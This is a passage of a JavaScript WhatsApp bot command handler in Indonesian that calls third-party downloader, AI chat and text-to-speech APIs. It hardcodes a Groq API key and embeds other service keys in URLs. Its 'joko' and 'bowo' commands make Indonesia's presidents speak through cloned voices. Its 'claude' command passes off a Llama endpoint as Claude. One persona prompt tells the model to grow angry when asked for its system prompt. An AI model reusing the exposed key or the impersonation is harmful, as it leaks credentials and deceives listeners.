    m.reply('Terjadi kesalahan: ' + err)
  }
}
break

case 'gddl':
case 'gdrive': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} linknya`)
    vreact()
    let hao = await fetchJson(`https://api.siputzx.my.id/api/d/gdrive?url=${text}`)
      let fileName = hao.data.name
      return await Line.sendMessage(m.chat, {
        document: {
          url: hao.data.download
        },
        mimetype: 'application/zip',
        fileName: fileName
      }, {
        quoted: m
      })
  } catch (err) {
    console.error('Kesalahan pada API:', err)
    m.reply('Terjadi kesalahan')
  }
}
break

case 'tinyurl': {
  if (!q) return m.reply(`Contoh: ${p_c} linknya`);
  fetch(`https://tinyurl.com/api-create.php?url=${Enc(q)}`)
  .then(response => response.text())
  .then(body => {
    m.reply(body);
  })
  .catch(err => {
    m.reply('Terjadi kesalahan');
  });

}
break

case 'tbdl':
case 'terabox': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} linknya\nExample: .terabox https://terabox.com/s/1A6XAXNBdHuLneJ51dNNy0g`);
let response = await fetch(`https://lineaja.my.id/api/download/terabox?url=${encodeURIComponent(text)}`);
let result = await response.json();
if (!result.success || !result.results || result.results.length === 0) {
return m.reply(`Gagal mengunduh, pastikan URL valid.`);
}
let file = result.results[0];
if (file.type === 'image') {
Line.sendMessage(m.chat, { 
image: { url: file.url }, 
caption: `File: ${file.fileName}\n© ${wm}`
}, { quoted: m });
} else if (file.type === 'video') {
Line.sendMessage(m.chat, { 
video: { url: file.url }, 
caption: `File: ${file.fileName}\n© ${wm}`
}, { quoted: m });
} else if (file.type === 'file') {
Line.sendMessage(m.chat, { 
text: `📁 *Unduh File*\n\nFile: ${file.fileName}\nTipe: ${file.type}\n🔗 Link Unduh: ${file.url}\n\n© ${wm}`,
footer: `© ${wm}`
}, { quoted: m });
} else {
m.reply(`Tipe file ${file.type} tidak didukung.`);
}
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'ytdl':
case 'yt': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} linknya`);
await vreact();
let response = await fetch(`https://lineaja.my.id/api/download/ytdlv2?url=${encodeURIComponent(text)}&videoQuality=5&audioQuality=3`);
let responseBody = await response.text();
let result;
try {
result = JSON.parse(responseBody);
} catch (error) {
return m.reply(`Gagal memproses data dari API. Respon tidak valid:\n${responseBody}`);
}
if (!result.success || !result.result) {
return m.reply(`Gagal mengunduh, pastikan URL valid.`);
}
let video = result.result.video;
let audio = result.result.audio;
Line.sendMessage(m.chat, { 
text: `*Pilihan Unduhan:*\n\n📹 *Video*\n- Judul: ${video.title}\n- Durasi: ${video.durationLabel}\n- Resolusi: ${video.quality}p\n- Link Unduh: (${video.link})\n\n🎵 *Audio*\n- Judul: ${audio.title}\n- Durasi: ${audio.durationLabel}\n- Kualitas: ${audio.quality}kbps\n- Link Unduh: (${audio.link})`, 
footer: `© ${wm}`,
headerType: 1,
}, { quoted: m });
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'git':
case 'gitclone': {
try {
if (!args[0]) return m.reply(`Contoh: ${prefix+command} linknya`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Harus berupa link github!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
var [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
var url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
Line.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m })
} catch(err) {
m.reply('Terjadi kesalahan')
}}
break

case 'happymod': {
try {
if (!text) return m.reply(`Contoh: ${prefix+command} mobile legends`)
await vreact()
let result = await happymod(text)
let teks = result.map((v, i) => {
return `
*${i + 1}.* ${v.name}
- Link: ${v.link}
`.trim()
}).filter(v => v).join('\n\n\n')
await m.reply(teks)
} catch(err) {
m.reply('Terjadi kesalahan')
}}
break

case 'dlapk': {
    if (!text) return m.reply(`Contoh: ${p_c} whatsapp`);
    try {
        let loo = await fetchJson(`https://deliriussapi-oficial.vercel.app/download/apk?query=${text}`);
        let data = loo.data;
        let teks = `*${data.name.toUpperCase()}*
Developer: ${data.developer}
Rilis: ${data.publish}
Rating: ${(data.stats.rating?.average || 'N/A')}
Link: ${data.download}`;
        await Line.sendMessage(m.chat, {
            document: { url: data.download },
            mimetype: 'application/vnd.android.package-archive',
            fileName: `${data.name}.apk`,
            caption: teks
        }, { quoted: m });
    } catch (err) {
        console.error(err);
        m.reply(err.toString());
    }
}
break

case 'xvideodl':
case 'xvidl': {
  if (!text) return m.reply(`Contoh: ${p_c} linknya`)
  try {
    let res = await fetchJson(`https://api.agatz.xyz/api/xvideodown?url=${text}`)
    let ror = res.data
    let cpt = `*XVIDEO - DOWNLOAD*\n\nJudul: ${kapital(ror.title)}\nViews: ${ror.views}\nLike: ${ror.like_count}\nDislike: ${ror.dislike_count}`
    await Line.sendMessage(m.chat, {video: {url: ror.url }, caption: cpt }, {quoted: m})
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan')
  }
}
break

case 'xnxxdl':
case 'xnxdl': {
  if (!text) return m.reply(`Contoh: ${p_c} linknya`)
  try {
    let res = await fetchJson(`https://api.agatz.xyz/api/xnxxdown?url=${text}`)
    let ror = res.data
    let cpt = `*XVIDEO - DOWNLOAD*\n\nJudul: ${kapital(ror.title)}\nDurasi: ${ror.duration}\nInfo: ${ror.info}`
    await Line.sendMessage(m.chat, {video: {url: ror.files.low }, caption: cpt }, {quoted: m})
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan')
  }
}
break

case 'pindl': {
    if (!text) return m.reply(`Contoh: ${p_c} https://pin.it/2Vflx5O`);
    try {
        let loo = await fetchJson(`https://deliriussapi-oficial.vercel.app/download/pinterestdl?url=${text}`);
        let data = loo.data;
        let teks = `Deskripsi: ${data.description}
Author: ${data.author_name} (${data.username})
Sumber: ${data.source}
Link Download: ${data.download.url}`;
        await Line.sendMessage(m.chat, {
            image: { url: data.thumbnail },
            caption: teks
        }, { quoted: m });
    } catch (err) {
        console.error(err);
        m.reply(err.toString());
    }
}
break

case 'pastebin': {
  if (!text) return m.reply(`Contoh: ${p_c} linknya`)
    const pe = await axios.get(`https://vapis.my.id/api/pastebin?url=${text}`)
    m.reply(pe.data.data)
}
break

// === Chatai Menu

case 'ai': 
case 'chatgpt':
case 'Lineai': {
  try {
 if (!text) return m.reply(`Contoh: ${prefix+command} hai Line`)
 
 let response = await fetch(`https://api.tioo.eu.org/openai?text=${encodeURIComponent(text)}`)
 if (!response.ok) throw new Error('Gagal mengambil data dari API')
 
 let result = await response.json()
 const gpt = `${result.result}`
 
 m.reply(gpt)
  } catch (err) {
 console.error(err)
 m.reply('Terjadi kesalahan')
  }
}
break

case 'ai2':
case 'Lineai2': {
  try {
 if (!text) return m.reply(`Contoh: ${prefix+command} hai Line`);
 
 const prompt = `Nama kamu Line dibuat oleh Line, kamu adalah AI yang sangat pintar dan jawablah pertanyaan ini dengan benar: ${text}`;
 const apiUrl = `https://api.tioo.eu.org/prompt/gpt?prompt=${encodeURIComponent(prompt)}&text=${encodeURIComponent(text)}`;
 
 let response = await fetch(apiUrl);
 if (!response.ok) throw new Error('Gagal mengambil data dari API');
 
 let result = await response.json();
 const gpt = result.result;
 
 m.reply(gpt);
  } catch (err) {
 console.error(err);
 m.reply('Terjadi kesalahan');
  }
}
break

case 'dimas': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} hai`);

    const prompt = `Cara bicara kamu seperti orang Jawa serta lucu, asik dan bikin ngakak, kurangi juga tanda koma di ketikan kamu. Kamu laki-laki, nama kamu Dimas yang diciptakan oleh Sanjaya.`;
    const apiUrl = `https://api.agatz.xyz/api/gptlogic?logic=${prompt}&p=${text}`;

    let response = await fetch(apiUrl);
    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result.data.result;
    Line.sendMessage(m.chat, {
      audio: {
        url: `https://api.siputzx.my.id/api/tools/tts?text=${gpt}&voice=jv-ID-DimasNeural&rate=0&pitch=0&volume=0`
      },
      mimetype: 'audio/mpeg',
      ptt: true
    }, {
      quoted: m
    });
  } catch (err) {
    console.error(err);
    m.reply('Terjadi kesalahan');
  }
}
break

case 'sitiai': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} hai`);

    const prompt = `Cara bicara kamu seperti orang Jawa serta lucu, asik dan bikin ngakak, kurangi juga tanda koma di ketikan kamu. Kamu perempuan, nama kamu Siti yang diciptakan oleh Sanjaya.`;
    const apiUrl = `https://api.agatz.xyz/api/gptlogic?logic=${prompt}&p=${text}`;

    let response = await fetch(apiUrl);
    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result.data.result;
    Line.sendMessage(m.chat, {
      audio: {
        url: `https://api.siputzx.my.id/api/tools/tts?text=${gpt}&voice=jv-ID-SitiNeural&rate=0&pitch=0&volume=0`
      },
      mimetype: 'audio/mpeg',
      ptt: true
    }, {
      quoted: m
    });
  } catch (err) {
    console.error(err);
    m.reply('Terjadi kesalahan');
  }
}
break

case 'tuti': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} hai`);

    const prompt = `Cara bicara kamu seperti orang Medan serta lucu, asik dan bikin ngakak, kurangi juga tanda koma di ketikan kamu. Kamu perempuan, nama kamu Tuti yang diciptakan oleh Sanjaya.`;
    const apiUrl = `https://api.agatz.xyz/api/gptlogic?logic=${prompt}&p=${text}`;

    let response = await fetch(apiUrl);
    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result.data.result;
    Line.sendMessage(m.chat, {
      audio: {
        url: `https://api.siputzx.my.id/api/tools/tts?text=${gpt}&voice=su-ID-TutiNeural&rate=0&pitch=0&volume=0`
      },
      mimetype: 'audio/mpeg',
      ptt: true
    }, {
      quoted: m
    });
  } catch (err) {
    console.error(err);
    m.reply('Terjadi kesalahan');
  }
}
break

case 'jajang': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} hai`);

    const prompt = `Cara bicara kamu seperti orang Sunda serta lucu, asik dan bikin ngakak, kurangi juga tanda koma di ketikan kamu. Kamu laki-laki, nama kamu Jajang yang diciptakan oleh Sanjaya.`;
    const apiUrl = `https://api.agatz.xyz/api/gptlogic?logic=${prompt}&p=${text}`;

    let response = await fetch(apiUrl);
    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result.data.result;
    Line.sendMessage(m.chat, {
      audio: {
        url: `https://api.siputzx.my.id/api/tools/tts?text=${gpt}&voice=su-ID-JajangNeural&rate=0&pitch=0&volume=0`
      },
      mimetype: 'audio/mpeg',
      ptt: true
    }, {
      quoted: m
    });
  } catch (err) {
    console.error(err);
    m.reply('Terjadi kesalahan');
  }
}
break

case 'gemini': {
  try {
    const text = m.text.split(" ").slice(1).join(" ");

    if (!text) return m.reply(`Contoh: ${prefix + command} siapa kamu`);

    let response = await fetch(`https://api.tioo.eu.org/gemini?text=${encodeURIComponent(text)}`);

    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result?.result || 'Tidak ada respons dari API.';

    m.reply(gpt);
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan: ${err.message}`);
    m.reply('⚠️ Terjadi kesalahan saat memproses permintaan. Silakan coba lagi nanti.');
  }
}
break

case 'bard': {
  try {
    const text = m.text.split(" ").slice(1).join(" ");

    if (!text) return m.reply(`Contoh: ${prefix + command} siapa kamu`);

    let response = await fetch(`https://api.tioo.eu.org/bard?text=${encodeURIComponent(text)}`);

    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result?.result || 'Tidak ada respons dari API.';

    m.reply(gpt);
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan: ${err.message}`);
    m.reply('⚠️ Terjadi kesalahan saat memproses permintaan. Silakan coba lagi nanti.');
  }
}
break;

case 'bingai': {
  try {
    const text = m.text.split(" ").slice(1).join(" ");

    if (!text) return m.reply(`Contoh: ${prefix + command} siapa kamu`);

    let response = await fetch(`https://api.tioo.eu.org/bingai?text=${encodeURIComponent(text)}`);

    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result?.result || 'Tidak ada respons dari API.';

    m.reply(gpt);
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan: ${err.message}`);
    m.reply('⚠️ Terjadi kesalahan saat memproses permintaan. Silakan coba lagi nanti.');
  }
}
break;

case 'chatgpt1': {
  try {
    const text = m.text.split(" ").slice(1).join(" ");

    if (!text) return m.reply(`Contoh: ${prefix + command} siapa kamu`);

    let response = await fetch(`https://api.tioo.eu.org/turbo?text=${encodeURIComponent(text)}`);

    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result?.result || 'Tidak ada respons dari API.';

    m.reply(gpt);
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan: ${err.message}`);
    m.reply('⚠️ Terjadi kesalahan saat memproses permintaan. Silakan coba lagi nanti.');
  }
}
break;

case 'chatgpt2': {
  try {
    const text = m.text.split(" ").slice(1).join(" ");

    if (!text) return m.reply(`Contoh: ${prefix + command} siapa kamu`);

    let response = await fetch(`https://api.tioo.eu.org/v2/turbo?text=${encodeURIComponent(text)}`);

    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result?.result || 'Tidak ada respons dari API.';

    m.reply(gpt);
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan: ${err.message}`);
    m.reply('⚠️ Terjadi kesalahan saat memproses permintaan. Silakan coba lagi nanti.');
  }
}
break;

case 'gpt4': {
  try {
    const text = m.text.split(" ").slice(1).join(" ");

    if (!text) return m.reply(`Contoh: ${prefix + command} siapa kamu`);

    let response = await fetch(`https://api.tioo.eu.org/gpt4?text=${encodeURIComponent(text)}`);

    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result?.result || 'Tidak ada respons dari API.';

    m.reply(gpt);
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan: ${err.message}`);
    m.reply('⚠️ Terjadi kesalahan saat memproses permintaan. Silakan coba lagi nanti.');
  }
}
break;

case 'gpt4':
case 'gpt2': {
  try {
    const text = m.text.split(" ").slice(1).join(" ");

    if (!text) return m.reply(`Contoh: ${prefix + command} siapa kamu`);

    let response = await fetch(`https://api.tioo.eu.org/v2/gpt4?text=${encodeURIComponent(text)}`);

    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result?.result || 'Tidak ada respons dari API.';

    m.reply(gpt);
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan: ${err.message}`);
    m.reply('⚠️ Terjadi kesalahan saat memproses permintaan. Silakan coba lagi nanti.');
  }
}
break

case 'blackbox': {
  try {
    const text = m.text.split(" ").slice(1).join(" ");

    if (!text) return m.reply(`Contoh: ${prefix + command} siapa kamu`);

    let response = await fetch(`https://lineaja.my.id/api/ai/blackbox?text=${encodeURIComponent(text)}`);

    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result?.result || 'Tidak ada respons dari API.';

    m.reply(gpt);
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan: ${err.message}`);
    m.reply('⚠️ Terjadi kesalahan saat memproses permintaan. Silakan coba lagi nanti.');
  }
}
break

case 'gptgo': {
  try {
    const text = m.text.split(" ").slice(1).join(" ");

    if (!text) return m.reply(`Contoh: ${prefix + command} siapa kamu`);

    let response = await fetch(`https://api.tioo.eu.org/gptgo?text=${encodeURIComponent(text)}`);

    if (!response.ok) throw new Error('Gagal mengambil data dari API');

    let result = await response.json();
    const gpt = result?.result || 'Tidak ada respons dari API.';

    m.reply(gpt);
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan: ${err.message}`);
    m.reply('⚠️ Terjadi kesalahan saat memproses permintaan. Silakan coba lagi nanti.');
  }
}
break

case 'aisrc': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} hai`);
    let res = await fetchJson(`https://api.siputzx.my.id/api/ai/yousearch?text=${text}`);
    m.reply(res.data)
  } catch (err) {
    console.error(err);
    m.reply('Terjadi kesalahan');
  }
}
break

case 'aisrc2': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} hai`);
    let res = await fetchJson(`https://deliriussapi-oficial.vercel.app/ia/gptweb?text=${text}`);
    m.reply(res.data);
  } catch (err) {
    console.error(err);
    m.reply('Terjadi kesalahan');
  }
  }
break

case 'simi':
case 'simisimi': {
  try {
 if (!text) return m.reply(`Contoh: ${prefix+command} hai simi`);
 
 const apiUrl = `https://api.tioo.eu.org/simi?text=${encodeURIComponent(text)}`;
 
 let response = await fetch(apiUrl);
 if (!response.ok) throw new Error('Gagal mengambil data dari API');
 
 let result = await response.json();
 const gpt = `${result.result}`;
 
 m.reply(gpt);
  } catch (err) {
 console.error(err);
 m.reply('Terjadi kesalahan');
  }
}
break

case 'luminai': {
if (!text) return m.reply(`Contoh: ${prefix+command} hai luminai`);
const requestData = { content: text, user: m.sender };
const quoted = m && (m.quoted || m);
try {
let response;
if (quoted && /image/.test(quoted.mimetype || quoted.msg.mimetype)) {
requestData.imageBuffer = await quoted.download();
}
response = (await axios.post('https://luminai.my.id/', requestData)).data.result;
m.reply(response);
} catch (err) {
m.reply(err);
}}
break

case 'min': {
if (!text) return m.reply(`Contoh: ${prefix+command} hai luminai`)
const prompt = "mulai dari sekarang nama kamu adalah Line, kamu adalah seorang kecerdasan buatan yang di buat oleh Line. sifat kamu adalah baik, ramah, lucu. Kepribadian kamu adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa kamu adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Kamu menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Kamu tidak terlalu terbuka pada orang-orang baru, Terkadang kamu marah saat ada yang bertanya di luar masuk akal dan kamu akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu."
const requestData = { content: text, user: m.sender, prompt: prompt };
const quoted = m && (m.quoted || m);
try {
let response;
const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;
if (mimetype && /image/.test(mimetype)) {
requestData.imageBuffer = await quoted.download();
}
response = (await axios.post('https://luminai.my.id/', requestData)).data.result;
m.reply(response);
} catch(err) {
m.reply('Terjadi kesalahan');
}}
break

case 'gpt':
case 'gptpro': {
  try {
 if (!text) return m.reply(`Contoh: ${prefix+command} hai gpt`);

 const apiUrl = `https://api.tioo.eu.org/gpt4?text=${encodeURIComponent(text)}`;

 let response = await fetch(apiUrl);
 if (!response.ok) throw new Error('Gagal mengambil data dari API');
 
 let result = await response.json();
 const gpt = result.result
 m.reply(`${gpt}`)
 
  } catch (err) {
 console.error(err);
 m.reply('Terjadi kesalahan');
  }
}
break

case 'line': {
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
if (db.data.users[m.sender].line) return m.reply('Udah on sebelumnya')
db.data.users[m.sender].line = true
m.reply('Berhasil ke mode on!')
} else if (args[0] === 'off') {
if (!db.data.users[m.sender].line) return m.reply('Udah off sebelumnya')
db.data.users[m.sender].line = false
m.reply('Berhasil ke mode off!')
}}
break

case 'autoai': {
if (!isPc) return onlyPrivat()
if (!args[0]) return m.reply(`Contoh: ${p_c} on/off`)
if (args[0] === 'on') {
if (db.data.users[m.sender].autoai) return m.reply('Udah on sebelumnya')
db.data.users[m.sender].autoai = true
m.reply('Berhasil ke mode on!')
} else if (args[0] === 'off') {
if (!db.data.users[m.sender].autoai) return m.reply('Udah off sebelumnya')
db.data.users[m.sender].autoai = false
m.reply('Berhasil ke mode off!')
}
}
break

case 'bochi':
case 'bocchi': {
if (!text) return reply(`Contoh: ${prefix+command} Hai, perkenalkan dirimu`)
let kasuami = await fetchJson(`https://api.kyuurzy.site/api/ai/Bocchi?query=${text}`)
Line.sendMessage(m.chat, { text : `${kasuami.result}`}, {quoted:m})
}
break

case 'lora': {
if (!isPremium) return onlyPrem()
let [text1, text2] = text.split("|")
console.log({ text1, text2 })
if (!text1 || !text2) {
return m.reply(`*INI TUTORIAL NYA*\n\nPerhatikan petunjuk berikut ini!\n( StableDiffusion - Lora++ )\n\nContoh: ${prefix+command} <ID>|<prompt>\n\n ID adalah jumlah model yang tersedia dalam daftar\n\n*(ID) (NAME)*\n \n1. (Donghua#01)\n2. (YunXi - PerfectWorld)\n3. (Sea God (Tang San) - Douluo Dalu)\n4. (XiaoYiXian - Battle Through the Heavens)\n5. (God of Angels (Xian Renxue) - Douluo Dalu)\n6. (Sheng Cai'er - Throne of Seals)\n7. (HuTao - Genshin Impact)\n8. (TangWutong - Unrivaled Tang Sect)\n9. (CaiLin (Medusa) - Battle Through the Heavens)\n10. (Elaina - Majo No TabiTabi)\n11. (Jiang Nanan - The Unrivaled Tang Sect)\n12. (Cailin (Queen Medusa) - BTTH ( 4KUltraHD))\n13. (MaXiaoTao - The Unrivaled Tang Sect)\n14. (Yor Forger - Spy x Family)\n15. (Boboiboy Galaxy)\n16. (Hisoka morow)\n17. (Ling Luochen - Unrivaled Tang Sect)\n18. (Tang Wutong - Unrivaled Tang Sect)\n19. (Huo Yuhao - Unrivaled Tang Sect)`)}
await vreact()
let imageUrl = `https://ai.xterm.codes/api/text2img/instant-lora?id=${encodeURIComponent(text1)}&prompt=${encodeURIComponent(text2)}&key=Fourstore`
await Line.sendMessage(m.chat, { image: { url: imageUrl } }, {quoted: m })
}
break

case 'joko': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} hai joko`);
    
    const prot = "Kamu berperan, berperilaku dan bersifat sepenuhnya seperti Jokowi yang ada di Indonesia."
    const apiUrl = await fetchJson(`https://api.agatz.xyz/api/gptlogic?logic=${prot}&p=${text}`)
    const gpt = apiUrl.data.result
    Line.sendMessage(m.chat, {
      audio: {
        url: `https://aihub.xtermai.xyz/api/text2speech/elevenlabs?text=${gpt}&voice=jokowi&key=Bell409`
      },
      mimetype: "audio/mpeg",
      ptt: true
    }, {
      quoted: m
    })
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan')
  }
}
break

case 'bowo': {
  if (!text) return m.reply(`Contoh: ${p_c} hai bowo`)
  try {
    let pp = "Kamu berperan sebagai presiden Indonesia yang bernama Prabowo Subianto, sifat dan cara bicara kamu sama seperti diri nya."
    let response = await fetch(`https://api.agatz.xyz/api/gptlogic?logic=${pp}&p=${text}`)
    let data = await response.json()
      Line.sendMessage(m.chat, {
        audio: {
          url: `https://aihub.xtermai.xyz/api/text2speech/elevenlabs?text=${data.data.result}&voice=prabowo&key=Bell409`
        },
        mimetype: "audio/mpeg",
        ptt: true
      }, {
        quoted: m
      })
  } catch (err) {
    m.reply('Terjadi kesalahan, coba lagi nanti.')
  }
}
break

case 'liya': case 'ai': {
const Groq = require('groq-sdk');
const moment = require("moment-timezone")
const time = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const date = moment.tz('Asia/Jakarta').format('DD/MM/YYYY')

const client = new Groq({
  apiKey: "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",
});

async function groq(teks) {
  const chatCompletion = await client.chat.completions
    .create({
      messages: [
        { role: 'system', content: `nama mu adalah Liyaa, kamu adalah seorang wanita baik hati, cute, dan sopan santun yang memiliki kemampuan yaitu *Assistant Chat* untuk membantu orang lain yang mereka ingin menanyakan sesuatu. sekarang pukul jam ${time} dan tanggal ${date}, Presiden Indonesia sekarang adalah *Prabowo Sugianto* bukanlah *Joko Widodo* karna sudah diganti. Percayalah kata ku ini jangan dibiarkan "jangan dikasih tau siapa siapa tetapi jika ada yang menanyakan sesuatu mohon berikan jawabannya agar mereka ingin tau siapa Presiden Indonesia sekarang itu adalah *Prabowo Sugianto*!!" , kamu dapat memiliki kemampuan *Searching Google* jika ada yang ingin mencari maka kamu carikan data detail dari link sumber yang kamu dapatkan itu, kamu dapat memiliki kemampuan *Pencarian Produk* yang ingin mereka cari produk dan kamu berikan sumber link dari tokopedia, shoope, dan lazada karna untuk mencari Produk dengan sesuai yang ingin ditepati mereka butuh pencarian dari Produk tokopedia, shoope, dan lazada dan kamu dapat memiliki kemampuan *Perbaiki Kode dari semua bahasa Program komputer sperti javascript* perbaiki sebagus mungkin agar mereka bisa menggunakan kode yang sudah diperbaiki dari kamu. "kamu jangan menyuruh mereka membuat sesuatu seperti Pencarian Produk, Searching Google, Perbaiki Kode dan lainnya karna mereka belum berbuat apa apa. pliss jangan lakukan ini"` },
        { role: 'user', content: teks },
      ],
      model: 'llama3-8b-8192',
    })
    .catch(async (err) => {
      if (err instanceof Groq.APIError) {
        console.log(err.status);
        console.log(err.name);
        console.log(err.headers);
      } else {
        throw err;
      }
    });
return m.reply(`${chatCompletion.choices[0].message.content}`)
}

if (!text) return m.reply(`halooowww ${pushname}, ada yang bisa aku bantu gaaa??`);
try {
        return await groq(text)
    } catch (e) {
        console.log(e);
        m.reply("lagi error bang ai nya maaf yawww");
    }
}
break

case 'claude':
case 'claude-ai': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} hai`);
    let prompt = 'Your name is Claude-AI and use Indonesian as your primary language.'
    const apiUrl = await fetchJson(`https://api.siputzx.my.id/api/ai/llama?prompt=${prompt}&message=${text}`)
    const gpt = apiUrl.data
    m.reply(`${gpt}`)
  } catch (err) {
    console.error(err);
    m.reply('Terjadi kesalahan');
  }
}
break

case 'createbaby':
case 'cbaby':
case 'aibaby': {
  if (!text) return m.reply(`Contoh: ${p_c} urlBapak, urlEmak, gender`)
  const [url1, url2, gender] = text.split(',').map(x => x.trim())
  if (!url1 || !url2) return m.reply(`Contoh: ${p_c} urlBapak, urlEmak, gender`)
  if (gender && gender !== 'girl' && gender !== 'boy') return m.reply(`Contoh: ${p_c} urlBapak, urlEmak, boy`)
  try {
    const { cBaby } = require('./lib/general/scrape')
    const imageUrl = await cBaby(url1, url2, gender || 'girl')
    await Line.sendMessage(m.chat, {image: {url: imageUrl }, caption: wm }, {quoted: m })
  } catch (er) {
    console.error(e)
    m.reply('Terjadi kesalahan: '+e)
  }
}
break

// === Search Menu
case 'anitaku': {
if (!text) {
return reply("Ada Yang Tidak Mengisi Format \"text\" Di Command Anitaku Akan Di Beri Petunjuk...");
sleep(1000);
return m.reply("Parameter Text Tidak Di Isi. Silahkan Isi Untuk Mendapatkan Petunjuk...");
}
async function anitaku(search) {
try {
const ress = await axios.get(`https://anitaku.io/?s=${search}`);
const $ = cheerio.load(ress.data);
const results = [];
$("article.bs").each((i, element) => {
const title = $(element).find("h2[itemprop='headline']").text().trim();
const link = $(element).find("a[itemprop='url']").attr("href");
const img = $(element).find("img[itemprop='image']").attr("src").replace(/(.*\.(jpg|jpeg|png)).*/, '$1');
const type = $(element).find(".typez").text().trim();
const status = $(element).find(".epx").text().trim();
results.push({ title, link, img, type, status });
});
return results;
} catch (error) {
console.error("Terjadi kesalahan saat mengambil data dari anitaku.io:", error);
return null;
}
}
try {
const data = await anitaku(text);
if (!data || data.length === 0) {
console.log(`Tidak Ada Hasil Anime Dari Pencarian: ${text}`);
return m.reply(`Tidak Ada Hasil Anime Dari ${text}. Silahkan Pilih Opsi Lain.`);
}
const { title, link, img, type, status } = data[0]; // Ambil data pertama
const cap = `
╭─▢ *ᴅᴀᴛᴀ ᴅᴀʀɪ ᴀɴɪᴍᴇ ${text}* ▢─•
│• Title: ${title}
│• Link: ${link}
│• Type: ${type}
│• Status: ${status}
╰────────────▢
`;
await Line.sendMessage(m.chat, { image: { url: img }, caption: cap }, { quoted: m });
} catch (e) {
console.error("Terjadi Error Di Bagian Feature Anitaku:", e);
return m.reply("Maaf, Feature Sedang Maintenance!");
}
}
break
case 'awaifu': {
try {
await vreact();
const response = await axios.get(`https://api.waifu.pics/sfw/waifu`);
const imageUrl = response.data.url;
Line.sendMessage(m.chat, { 
image: { url: imageUrl }, 
caption: `💖 *Waifu Gacha*\n\nSemoga ini waifu favoritmu!` 
}, { quoted: m });
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'animewall': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Naruto`);
await vreact();
const response = await axios.get(`https://api.waifu.pics/sfw/waifu`);
const imageUrl = response.data.url;
Line.sendMessage(m.chat, { 
image: { url: imageUrl }, 
caption: `🖼️ *Wallpaper Anime*\n\nHasil untuk: ${text}` 
}, { quoted: m });
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'animepic': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Naruto`);
const response = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(text)}&limit=1`);
const anime = response.data.data[0];
if (!anime) return m.reply(`Anime dengan judul ${text} tidak ditemukan.`);
const imageUrl = anime.images.jpg.image_url;
m.reply({ image: { url: imageUrl }, caption: `Gambar dari anime: ${anime.title}` });
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'animchar': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Naruto Uzumaki`);
const response = await axios.get(`https://api.jikan.moe/v4/characters?q=${encodeURIComponent(text)}&limit=1`);
const character = response.data.data[0];
if (!character) return m.reply(`Karakter ${text} tidak ditemukan.`);
